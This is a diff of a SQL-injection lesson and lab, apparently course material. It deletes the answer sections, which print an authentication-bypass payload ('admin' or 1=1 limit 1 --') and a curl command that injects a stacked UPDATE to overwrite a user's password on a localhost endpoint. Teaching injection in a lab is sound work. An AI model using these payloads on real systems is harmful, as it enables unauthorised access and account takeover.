@@ -23,19 +23,6 @@ Let's say we are an attacker and want to execute some arbitrary SQL into this.
 2. What string would we place into that field?
 3. Who would this log us in as?
 
-<details>
-  <summary>Answer</summary>
-
-  1. We would need to chose the `username` field in this case because if we chose the password field, our exploit would be hashed before it reaches the database.
-  2. We could use something similar to the following as the `username` field to gain access:
-  ```
-  admin' or 1=1 limit 1 --
-  ```
-  **Followup Question: Why do we need the `--`?**
-  3. This would log us in as the first admin depending on the sort order.
-
-</details>
-
 # Lab
 
 Try to exploit the endpoint `/login` using a SQL injection. A valid, but unauthorized request looks like this:
@@ -46,19 +33,3 @@ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "passwor
 
 Try to gain access as the user `rick`.
 
-<details>
-  <summary>Answer</summary>
-
-  Though you may not be able to execute a 1=1 type login, you can still update the password and re-login a separate time
-
-  ```
-  $ curl -XPOST -H 'Content-Type: application/json' -d "{\"username\":\"rick'; update users set password=md5('password') where username = 'rick' --\", \"password\":\"foo\"}" 'http://localhost:8080/login'
-  ```
-
-  We should get an error and that's fine, we've broken the JDBC parser and successfully changed `rick`s password to something we know: `password`. Now try logging in with that password:
-
-  ```
-  $ curl -XPOST -H 'Content-Type: application/json' -d '{"username":"rick", "password":"password"}' 'http://localhost:8080/login' | jq .
-  ```
-
-</details>
